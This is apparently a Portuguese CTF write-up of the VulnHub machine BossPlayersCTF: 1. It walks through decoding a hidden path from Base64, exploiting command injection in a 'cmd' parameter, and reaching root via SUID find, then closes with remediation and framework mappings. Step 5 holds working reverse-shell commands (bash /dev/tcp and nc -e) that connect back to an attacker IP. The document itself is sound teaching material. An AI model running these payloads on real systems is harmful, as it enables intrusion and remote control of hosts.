# VulnHub BossPlayersCTF: 1 — Base64 Steganografia até Root via SUID find

Caramba rapaziada!! Uma máquina que esconde seu vetor de ataque dentro de uma string Base64 com três camadas enterrada num comentário HTML, depois te entrega injeção de comando de bandeja, e termina com a escalada SUID mais clássica de todos os GTFOBins que você vai ver. Top demais como máquina para iniciantes entenderem por que "segurança por obscuridade" não é segurança de jeito nenhum. Mano, codificar seus segredos em Base64 não é criptografia, tá ligado?

Valeu ao autor por essa cadeia compacta que cobre recon, análise de encoding, RCE e privesc via SUID num só pacote limpo.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Fácil / Iniciante |
| **VM Alvo** | BossPlayersCTF: 1 |
| **VM do Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/bossplayersctf-1,375/ |
| **Técnicas** | Análise do código-fonte web, decodificação multi-camada Base64, injeção de comando via parâmetro GET, reverse shell, escalação de privilégios via SUID find |
| **CVEs / CWEs** | CWE-78 (OS Command Injection), CWE-312 (Armazenamento em Texto Simples no Comentário HTML), CWE-269 (Gerenciamento de Privilégios Impróprio via SUID), CWE-656 (Segurança por Obscuridade via Base64) |
| **Grupos APT** | APT41 (injeção de comando web para acesso inicial), Lazarus Group (OS command injection em apps web PHP customizadas), FIN7 (abuso de SUID para escalação local de privilégios) |

---

## Resumo do Ataque

```
[descoberta de host: netdiscover]
    |
    v
[nmap: 22/tcp SSH | 80/tcp Rocket httpd]
    |
    v
[código-fonte da página => string Base64 em comentário HTML]
    |
    v
[3x decodificação Base64 => "workinginprogress.php"]
    |
    v
[GET ?cmd=id => uid=33(www-data) => injeção de comando confirmada]
    |
    v
[listener nc => payload reverse shell via ?cmd=]
    |
    v
[shell como www-data]
    |
    v
[find / -perm -u=s => /usr/bin/find tem SUID]
    |
    v
[find . -exec /bin/sh -p \; -quit => euid=0(root)]
    |
    v
[/root/root.txt | base64 -d]
```

---

## Metodologia

1. Descoberta de host com netdiscover
2. Varredura de portas com nmap: HTTP (80) e SSH (22)
3. Visualizar código-fonte da página, identificar string Base64 em comentário HTML
4. Decodificação multi-camada Base64 para encontrar página PHP oculta
5. Confirmar OS command injection via `?cmd=id`
6. Reverse shell via injeção de comando
7. Escalação de privilégios via SUID `find` pela técnica GTFOBins
8. Captura da flag root (codificada em Base64)

---

## Passo 1 — Identificando o Alvo

```bash
netdiscover -r 192.168.1.0/24
```

Alvo: **192.168.1.107**

```bash
nmap -A 192.168.1.107
```

Saída esperada:

```
22/tcp  open  ssh    OpenSSH
80/tcp  open  http   Rocket httpd
```

Dois serviços: SSH e HTTP. Nada exótico na superfície.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Passo 2 — Enumeração Web

```bash
dirb http://192.168.1.107/
```

`robots.txt` é encontrado. Seu conteúdo decodifica para uma mensagem de troll: rabbit hole. Movimento clássico de CTF.

Visualize o código-fonte de `http://192.168.1.107/` no navegador ou via curl:

```bash
curl -s http://192.168.1.107/ | grep '<!--'
```

Um comentário HTML contém uma string codificada em Base64:

```html
<!-- WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK -->
```

> **O que é segurança por obscuridade via Base64?** Base64 é um esquema de codificação, não criptografia. Não oferece nenhuma confidencialidade: qualquer atacante que veja a string codificada pode decodificá-la trivialmente. Embutir caminhos "ocultos" em comentários HTML usando Base64 é um erro comum de desenvolvedor que cria a ilusão de segurança. Mapeia para CWE-656 e CWE-312.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Passo 3 — Decodificação Multi-Camada Base64

Decodifique a string em três rodadas de Base64:

```bash
# Rodada 1
echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
# Saída: ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K

# Rodada 2
echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
# Saída: d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==

# Rodada 3
echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
# Saída: workinginprogress.php
```

Página oculta encontrada: `http://192.168.1.107/workinginprogress.php`

Acesse o endereço. A página lista softwares instalados (Debian, Apache2, PHP) e mostra dois itens incompletos:
- "test the ping command" (dica de injeção)
- "fix privilege escalation" (dica de privesc)

O desenvolvedor literalmente deixou uma lista de tarefas das vulnerabilidades numa página publicamente acessível. Ixi, que coisa.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1592.002 Gather Victim Host Information: Software

---

## Passo 4 — Descoberta e Confirmação de Injeção de Comando

> **O que é OS Command Injection?** Quando uma aplicação web passa entrada fornecida pelo usuário para um comando do sistema (via `system()`, `exec()`, `shell_exec()`, `popen()`, backticks, etc.) sem sanitização, o atacante pode acrescentar comandos arbitrários usando metacaracteres de shell. Mapeia para CWE-78 e OWASP A03:2021 Injection.

Teste o parâmetro GET `cmd`:

```bash
# Confirmar injeção de comando
curl "http://192.168.1.107/workinginprogress.php?cmd=id"
```

Saída esperada:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Injeção de comando confirmada como `www-data`. O parâmetro `cmd` é passado diretamente para um comando shell sem nenhuma validação. Vacilou!

```bash
# Verificação adicional
curl "http://192.168.1.107/workinginprogress.php?cmd=whoami"
# www-data

curl "http://192.168.1.107/workinginprogress.php?cmd=hostname"
# bossplayers
```

> **Nota do mundo real:** Injeção de comando OS via parâmetros GET/POST é algo consistentemente na OWASP Top 10 e é ativamente explorada pelo APT41 e Lazarus Group em aplicações PHP web. CVE-2017-12149 (injeção de comando JBoss) e CVE-2021-41277 (RCE Metabase) são exemplos reais da mesma primitiva. Referência: CWE-78, OWASP A03:2021.

> **MITRE ATT&CK:** TA0001 Initial Access | T1190 Exploit Public-Facing Application | T1059.004 Unix Shell

---

## Passo 5 — Reverse Shell

Configure um listener na máquina atacante:

```bash
nc -lvp 1234
```

Acione o reverse shell via ponto de injeção. Codifique o payload por URL:

```bash
# Usando bash TCP reverse shell
curl -G "http://192.168.1.107/workinginprogress.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.105/1234 0>&1'"
```

Ou via URL no navegador (substitua espaços por `+` ou `%20`):

```
http://192.168.1.107/workinginprogress.php?cmd=nc+-e+/bin/bash+192.168.1.105+1234
```

Shell recebido como `www-data`. Estabilize:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

> **MITRE ATT&CK:** TA0002 Execution | T1059.004 Unix Shell

---

## Passo 6 — Escalação de Privilégios via SUID find

> **O que é escalação de privilégios via SUID?** O bit SUID (Set User ID) num executável faz com que ele rode com as permissões do dono do arquivo em vez do chamador. Se um binário de posse do root com SUID pode ser abusado para executar comandos arbitrários (conforme documentado no GTFOBins), qualquer usuário pode obter execução como root. Mapeia para CWE-269 e MITRE T1548.001.

Enumere binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/find` tem o bit SUID configurado. GTFOBins documenta a escalada:

```bash
find . -exec /bin/sh -p \; -quit
```

Confirme root:

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root)
```

O `euid=0` (UID efetivo) é o que importa aqui. A flag `-p` diz ao `/bin/sh` para preservar o UID efetivo em vez de descartá-lo.

> **Referência GTFOBins:** https://gtfobins.github.io/gtfobins/find/

**(☞ﾟヮﾟ)☞ Root efetivo conquistado!! GG!!**

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1548.001 Setuid and Setgid

---

## Passo 7 — Flag Root

```bash
cd /root
ls
cat root.txt
```

O conteúdo da flag é codificado em Base64. Decodifique:

```bash
cat root.txt | base64 -d
```

O autor usou Base64 na flag também. Círculo completo: a máquina começa e termina com Base64.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|----------------|
| Caminho oculto | `workinginprogress.php` | Comentário HTML (3x Base64 decodificado) | Navegação |
| RCE como | `www-data (uid=33)` | `?cmd=id` | Injeção de comando |
| Root efetivo | `euid=0(root)` | Escalada via SUID find | Escalação de privilégios |
| Flag Root | Codificada em Base64 (decodifique com `base64 -d`) | `/root/root.txt` | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | Caminho oculto em comentário HTML codificado com multi-camadas Base64 | Base64 é codificação, não criptografia; desenvolvedores frequentemente commitem "segredos" assim em repos git | Use `.gitignore`, variáveis de ambiente e secret scanning (GitLeaks, TruffleHog) para prevenir exposição de segredos |
| 2 | Parâmetro `?cmd=` passado ao shell sem sanitização | OS command injection é um achado de alto impacto em pentests de aplicação web; chamadas PHP `system()` com entrada de usuário são particularmente perigosas | Valide toda entrada; use chamadas parametrizadas ou evite comandos do sistema completamente; prefira funções nativas PHP |
| 3 | Bit SUID em `/usr/bin/find` | Desenvolvedores e sysadmins ocasionalmente configuram SUID em utilitários padrão por conveniência, criando um caminho permanente de privesc | Audite binários SUID regularmente; remova SUID de qualquer utilitário que não exija isso |

**Por que isso importa fora do lab?**

Injeção de comando OS em aplicações web não é acadêmica. CVE-2021-41277 (RCE Metabase via `/api/setup/validate`) alcançou exatamente esse padrão em ambientes de produção em larga escala. O APT41 tem uso extensivamente documentado de injeção de comando web como payload de primeira etapa em intrusões direcionadas. A escalada via SUID `find` é tão conhecida que está referenciada em todo checklist de escalação de privilégios Linux, do LinPEAS ao GTFOBins até o exame OSCP. Encontrá-la em produção significa que alguém executou `chmod u+s /usr/bin/find` em algum momento e nunca mais olhou para isso.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Gather Victim Host Information: Software | T1592.002 |
| Reconhecimento | TA0043 | File and Directory Discovery | T1083 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execução | TA0002 | Exploitation for Client Execution | T1203 |
| Escalação de Privilégios | TA0004 | Abuse Elevation Control Mechanism: Setuid | T1548.001 |
| Evasão de Defesa | TA0005 | Obfuscated Files or Information | T1027 |
| Descoberta | TA0007 | File and Directory Discovery (enumeração SUID) | T1083 |
| Coleta | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Remova o caminho codificado em Base64 do comentário HTML; nunca use comentários HTML para referenciar caminhos ou funcionalidades internas.
2. Sanitize o parâmetro `cmd`: valide entrada, use whitelist, ou elimine completamente a chamada do comando do sistema; prefira funções PHP nativas de rede em vez de execução shell.
3. Remova o bit SUID do `/usr/bin/find`: `chmod u-s /usr/bin/find`
4. Audite todos os binários SUID e remova bits SUID desnecessários: `find / -perm -4000 -type f 2>/dev/null`
5. Remova ou restrinja entradas do `robots.txt` para evitar que itens troll/rabbit hole sejam indexados.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Bloqueie o parâmetro `?cmd=` no nível do WAF imediatamente.
- Remova ou proteja com senha o arquivo `workinginprogress.php`.
- Audite todos os arquivos na web root em busca de chamadas de comando do sistema: `grep -r "system\|exec\|shell_exec\|passthru\|popen" /var/www/`
- Revise todos os binários SUID: `find / -perm -u=s -type f 2>/dev/null`

**Contramedidas MITRE D3FEND:**
- D3-IAA Input Allow Listing para prevenir injeção de comando OS (T1190, CWE-78)
- D3-EAL Executable Allow Listing para restringir caminhos de execução SUID (T1548.001)
- D3-OAA Outbound Network Traffic Allow Listing para prevenir callbacks de reverse shell (T1059.004)
- D3-FAPA File Access Pattern Analysis para detectar exposição de caminhos em comentário HTML (CWE-312)

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identify (ID.RA): Identifique a superfície de ataque da aplicação web, incluindo caminhos de execução de comando shell.
- Protect (PR.PT-3): Menor Funcionalidade; desabilite funcionalidades não utilizadas e remova páginas de debug da produção.
- Protect (PR.DS-5): Proteção contra vazamento de dados; revise o código-fonte HTML em busca de segredos embutidos.
- Detect (DE.CM-8): Varredura de vulnerabilidades para detectar endpoints de injeção de comando.
- Respond (RS.AN-1): Análise: investigue todas as requisições HTTP para parâmetros parecidos com comandos shell.

**NIST SP 800-53 Rev. 5:**
- SI-10: Information Input Validation (prevenir injeção de comando OS via parâmetros GET)
- CM-7: Least Functionality (remover SUID de utilitários padrão; remover páginas PHP de debug)
- AC-6: Least Privilege (conta de serviço web não deve ter caminho de escalada via SUID)
- SI-3: Malicious Code Protection (monitorar web shells e RCE em aplicações PHP)
- AU-3: Content of Audit Records (registrar todas as requisições para endpoints de execução de comando)

**CISA Known Exploited Vulnerabilities:**
- Sem CVE direto para esta aplicação customizada específica; CVE-2021-41277 (RCE Metabase) e CVE-2017-12149 (RCE JBoss) no catálogo CISA KEV representam a mesma primitiva de OS command injection em escala.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ASSET (Asset, Change, and Configuration Management)
- Prática: Manage IT Asset Inventory and Configuration
- MIL Alvo: MIL-1 (inventário base de aplicações web com exposição SUID conhecida)

---

## Considerações Finais

Valeu ao autor do BossPlayersCTF: 1 por uma máquina acessível para iniciantes que demonstra três conceitos de segurança genuinamente importantes: Base64 não é segurança, parâmetros shell sem sanitização são RCE crítico, e SUID em utilitários padrão é um backdoor permanente de privesc.

O truque da triple-camada Base64 é um puzzle divertido, mas a lição real é que qualquer um que encontre esse comentário via view-source ou `curl` vai decodificá-lo em menos de 30 segundos. "Escondido à vista" não é controle de acesso.

Se esse walkthrough te ajudou, compartilha com a galera e continua hackando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
